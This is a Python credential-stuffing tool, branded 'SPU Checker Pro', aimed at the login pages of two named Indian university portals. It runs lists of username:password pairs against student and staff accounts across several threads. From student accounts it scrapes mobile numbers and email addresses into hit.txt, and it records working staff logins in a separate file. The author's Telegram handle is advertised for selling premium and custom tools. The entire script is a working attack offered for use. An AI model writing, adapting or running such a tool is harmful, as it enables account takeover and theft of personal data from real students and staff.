import httpx
import asyncio
import re
import time
import sys
import threading
import concurrent.futures
from queue import Queue
from datetime import datetime



async def attack_on_spu_student(data):
    try:
        username = data['username']
        password = data['password']

        print(f"  🔐 Attempting login with credentials: {username}")

        async with httpx.AsyncClient(timeout=30.0) as session:
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.8',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://spumandiexam.in',
                'Referer': 'https://spumandiexam.in/Authenticate/Login',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-GPC': '1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
                'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                # 'Cookie': 'ASP.NET_SessionId=u3lg3hamd5z1mczxgm0amokb',
            }

            data = {
                'RegistrationNumber': username,
                'Password': password,
            }

            print("  🔌 Connecting to SPU server...")
            try:
                response = await session.post('https://spumandiexam.in/Authenticate/Login', headers=headers, data=data, follow_redirects=True)

                if response.status_code == 200:
                    print("  ✅ Login successful! Extracting user data...")
                else:
                    print(f"  ❌ Login failed with status code: {response.status_code}")
                    return False
            except Exception as e:
                print(f"  ❌ Connection error: {e}")
                return False

            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.8',
                'Connection': 'keep-alive',
                'Referer': 'https://spumandiexam.in/StudentRegistration/RegisterStudent',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-GPC': '1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
                'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                # 'Cookie': 'ASP.NET_SessionId=u3lg3hamd5z1mczxgm0amokb; .ASPXAUTH=B53DBF71C7B83701690A3C5EC84872F1C8842990DCDEC21152E58669A37EF6598E6F44E59285CD7B6D8E8AC6E41D4BF6C560A66D301B0DFF85B593AA70216C16E8307B92938C2FBA39AA9DD124C3D37CE5B5E38B6486547CFF18163E31510197',
            }

            print("  🔍 Searching for contact information...")
            try:
                response = await session.get('https://spumandiexam.in/ExamForm/UpdateMobileNoEmailId', headers=headers)

                patterns = {
                    'mobile': r'placeholder="Mobile No." type="text" value="(\d+)"',
                    'email': r'placeholder="Email Id" type="text" value="([^"]+)"'
                }

                results = {key: re.search(pattern, response.text) for key, pattern in patterns.items()}

                if results['mobile'] and results['email']:
                    mobile = results['mobile'].group(1)
                    email = results['email'].group(1)

                    print(f"  📱 Found mobile: {mobile[:4]}****{mobile[-2:]}")
                    print(f"  📧 Found email: {email[:3]}****{email.split('@')[1]}")

                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    with open('hit.txt', 'a') as f:
                        f.write(f"{username}:{password}|{mobile}|{email}|{timestamp}\n")

                    print("  💾 Data saved to hit.txt successfully!")
                    return True
                else:
                    print("  ⚠️ No contact information found for this account")
                    return False
            except Exception as e:
                print(f"  ❌ Data extraction error: {e}")
                return False

    except Exception as e:
        print(f"  ❌ Error: {e}")
        return False



async def attack_on_spu_authority(data):
    try:
        username = data['username']
        password = data['password']

        print(f"  🔐 Attempting login with credentials: {username}")

        async with httpx.AsyncClient(timeout=30.0) as session:

            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://spumandiexam.in',
                'Referer': 'https://spumandiexam.in/StaffAuthentication/Login',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Sec-GPC': '1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                # 'Cookie': 'ASP.NET_SessionId=3crxds3acsiwat1pmu2so0t4',
            }

            data = {
                'EmailId': username,
                'Password': password,
            }

            print("  🔌 Connecting to SPU server...")
            try:
                response = await session.post('https://spumandiexam.in/StaffAuthentication/Login', headers=headers, data=data, follow_redirects=True)

                # Check if login was successful by looking for error message
                login_error_match = re.search(r'data-valmsg-summary="true"><ul><li>(.*?)</li>', response.text)

                if login_error_match and login_error_match.group(1) == "Please enter valid login credentials.":
                    print(f"  ❌ Login failed: Invalid credentials")
                    return False

                # Check if we're redirected to a dashboard or profile page
                else :
                    # Save the successful login to authority_hit.txt
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    with open('authority_hit.txt', 'a') as f:
                        f.write(f"{username}:{password}|{timestamp}\n")

                    print("  💾 Data saved to authority_hit.txt successfully!")
                    return True


            except Exception as e:
                print(f"  ❌ Connection error: {e}")
                return False
    except Exception as e:
        print(f"  ❌ Error: {e}")
        return False



async def attack_on_gdc_authority(data):
    try:
        username = data['username']
        password = data['password']

        print(f"  🔐 Attempting login with credentials: {username}")

        async with httpx.AsyncClient(timeout=30.0) as session:

            headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://www.gckullu.ac.in/',
            'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            }
            response = await session.get('https://www.gckullu.ac.in/staffpanel/login.aspx', headers=headers)
            VIEWSTATEGENERATOR = re.search(r'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="([^"]+)"', response.text).group(1)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.gckullu.ac.in',
                'priority': 'u=0, i',
                'referer': 'https://www.gckullu.ac.in/staffpanel/login.aspx',
                'sec-ch-ua': '"Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            }

            data = {
                '__EVENTTARGET': '',
                '__EVENTARGUMENT': '',
                '__VIEWSTATE': '/wEPDwUKLTMyODU3MDk3MWRkIHg3kmMi0ej4O/KhS8MsfBxRARI=',
                '__VIEWSTATEGENERATOR': VIEWSTATEGENERATOR,
                'txtUname': username,
                'txtPwd': password,
                'btnLogin': 'Login',
            }


            print("  🔌 Connecting to GDC server...")
            try:
                response = await session.post('https://www.gckullu.ac.in/staffpanel/login.aspx', headers=headers, data=data, follow_redirects=True)

                if response.url != 'https://www.gckullu.ac.in/staffpanel/login.aspx':
                    print("  ✅ Login successful! Authority access confirmed.")
                    # Save the successful login to authority_hit.txt
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    with open('authority_hit.txt', 'a') as f:
                        f.write(f"{username}:{password}|{timestamp}\n")

                    print("  💾 Data saved to authority_hit.txt successfully!")
                    return True
                else:
                    print(f"  ❌ Login failed: Invalid credentials")
                    return False

            except Exception as e:
                print(f"  ❌ Connection error: {e}")
                return False
    except Exception as e:
        print(f"  ❌ Error: {e}")
        return False



# Run the async function
def read_credentials():
    with open('data.txt', 'r') as f:
        for line in f:
            userid, password = line.strip().split(':')
            yield {'username': userid, 'password': password}

def intro():
    print("\n" + "*"*60)
    print("*" + " "*58 + "*")
    print("*" + " "*18 + "🔥 SPU CHECKER PRO 🔥" + " "*18 + "*")
    print("*" + " "*58 + "*")
    print("*"*60)

    print("\n🚀 Welcome to the ULTIMATE SPU Checker Tool! 🚀")
    print("\n📋 Quick Setup:")
    print("  1️⃣  Create 'data.txt' in this directory")
    print("  2️⃣  Add credentials as 'username:password' (one per line)")
    print("  3️⃣  Run this tool to extract information")

    print("\n💾 Results will be saved to 'hit.txt'")

    print("\n👑 Created by: OG Celestial")
    print("\n📱 Connect with me:")
    print("  [1] Telegram: @info_celestialbeing")
    print("  [2] Join my channel for more tools")
    print("  [3] Get premium tools and support")
    print("  [4] Contact for custom tools")

    print("\n🔑 Login Options:")
    print("  [S] Student Login (Default)")
    print("  [A] SPU Authority/Staff Login")
    print("  [G] GDC Authority/Staff Login")

    print("\n💻 Performance Settings:")
    print("  [T] Set Thread Count (Default: 1)")

    choice = input("\n🔍 Enter option (1-4, S/A/G, T) or press ENTER to start: ")

    login_type = "student"  # Default login type
    thread_count = 1  # Default thread count

    if choice.upper() == "T":
        while True:
            try:
                thread_input = input("\n💻 Enter number of threads (1-10): ")
                thread_count = int(thread_input)
                if 1 <= thread_count <= 10:
                    print(f"\n⚙️ Thread count set to: {thread_count}")
                    break
                else:
                    print("\n⚠️ Please enter a number between 1 and 10.")
            except ValueError:
                print("\n⚠️ Please enter a valid number.")

        # After setting thread count, ask for login type
        login_choice = input("\n🔑 Select login type (S/A/G) or press ENTER for default: ")
        if login_choice.upper() == "S" or login_choice == "":
            print("\n👨‍🎓 Selected Student Login Mode")
            login_type = "student"
        elif login_choice.upper() == "A":
            print("\n👨‍🏫 Selected SPU Authority/Staff Login Mode")
            login_type = "authority"
        elif login_choice.upper() == "G":
            print("\n🏫 Selected GDC Authority/Staff Login Mode")
            login_type = "gdc_authority"
    elif choice.upper() == "S":
        print("\n👨‍🎓 Selected Student Login Mode")
        login_type = "student"
    elif choice.upper() == "A":
        print("\n👨‍🏫 Selected SPU Authority/Staff Login Mode")
        login_type = "authority"
    elif choice.upper() == "G":
        print("\n🏫 Selected GDC Authority/Staff Login Mode")
        login_type = "gdc_authority"
    elif choice == "1":
        print("\n🔗 Opening Telegram... Message me directly at @info_celestialbeing")
        print("\n⏳ Press ENTER to continue to SPU Checker...")
        input()
    elif choice == "2":
        print("\n🔗 Join my Telegram channel for more amazing tools!")
        print("📲 https://t.me/info_celestialbeing")
        print("\n⏳ Press ENTER to continue to SPU Checker...")
        input()
    elif choice == "3":
        print("\n💎 Get PREMIUM access to all my tools!")
        print("📲 Contact me on Telegram: @info_celestialbeing")
        print("\n⏳ Press ENTER to continue to SPU Checker...")
        input()
    elif choice == "4":
        print("\n🛠️ Need custom tools for your specific needs?")
        print("📲 Contact me on Telegram: @info_celestialbeing")
        print("\n⏳ Press ENTER to continue to SPU Checker...")
        input()

    print("\n🔄 Starting SPU Checker... Get ready!")
    print("\n" + "*"*60)

    return login_type, thread_count


# Thread-safe counter and progress bar
class ProgressTracker:
    def __init__(self, total):
        self.total = total
        self.current = 0
        self.successful = 0
        self.lock = threading.Lock()

    def increment(self, success=False):
        with self.lock:
            self.current += 1
            if success:
                self.successful += 1
            self.update_progress_bar()

    def update_progress_bar(self, bar_length=30):
        percent = float(self.current) * 100 / self.total
        arrow = '█' * int(percent/100 * bar_length)
        spaces = ' ' * (bar_length - len(arrow))

        sys.stdout.write(f"\r  Progress: [{arrow}{spaces}] {percent:.2f}% ({self.current}/{self.total}) - Successful: {self.successful}")
        sys.stdout.flush()

# Worker function for thread pool
def process_credential(cred, login_type, tracker):
    try:
        if login_type == "student":
            result = asyncio.run(attack_on_spu_student(cred))
        elif login_type == "authority":
            result = asyncio.run(attack_on_spu_authority(cred))
        elif login_type == "gdc_authority":
            result = asyncio.run(attack_on_gdc_authority(cred))

        tracker.increment(success=result)
        return result
    except Exception as e:
        print(f"\n❌ Error processing {cred['username']}: {e}")
        tracker.increment(success=False)
        return False

def main():
    login_type, thread_count = intro()
    credentials = list(read_credentials())
    total_creds = len(credentials)

    if total_creds == 0:
        print("\n⚠️ No credentials found in data.txt! Please add some credentials first.")
        return

    print(f"\n🔍 Found {total_creds} credentials to check...")
    print(f"\n📅 Session started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    if login_type == "student":
        print("\n👨‍🎓 Mode: Student Login - Extracting mobile numbers and emails")
    elif login_type == "authority":
        print("\n👨‍🏫 Mode: SPU Authority/Staff Login - Checking valid credentials")
    elif login_type == "gdc_authority":
        print("\n🏫 Mode: GDC Authority/Staff Login - Checking valid credentials")

    print(f"\n⚙️ Thread count: {thread_count}")
    print("\n" + "-"*60)

    # Initialize progress tracker
    tracker = ProgressTracker(total_creds)
    start_time = time.time()

    # Process credentials based on thread count
    if thread_count == 1:
        # Single-threaded mode
        print("\n🕓 Running in single-threaded mode...")
        for cred in credentials:
            print(f"\n⚡ Processing credential: {cred['username']}")
            process_credential(cred, login_type, tracker)
    else:
        # Multi-threaded mode
        print(f"\n💻 Running with {thread_count} threads...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
            # Submit all tasks to the executor
            futures = [executor.submit(process_credential, cred, login_type, tracker) for cred in credentials]

            # Wait for all tasks to complete
            concurrent.futures.wait(futures)

    elapsed_time = time.time() - start_time
    minutes, seconds = divmod(elapsed_time, 60)

    print("\n\n" + "-"*60)
    print(f"\n✅ Process completed in {int(minutes)}m {int(seconds)}s!")
    print(f"\n📊 Results summary:")
    print(f"  • Total credentials processed: {total_creds}")
    print(f"  • Successful logins: {tracker.successful}")
    print(f"  • Success rate: {(tracker.successful/total_creds)*100:.2f}%")

    if tracker.successful > 0 and login_type == "student":
        print(f"\n💾 Check 'hit.txt' for the extracted data!")
    elif tracker.successful > 0 and login_type == "authority":
        print(f"\n💾 Valid SPU authority credentials saved to 'authority_hit.txt'!")
    elif tracker.successful > 0 and login_type == "gdc_authority":
        print(f"\n💾 Valid GDC authority credentials saved to 'authority_hit.txt'!")

    print("\n💬 Need more tools or support?")
    print("  ➡️ Contact me on Telegram: @info_celestialbeing")
    print("\n" + "*"*60)

if __name__ == "__main__":
    main()






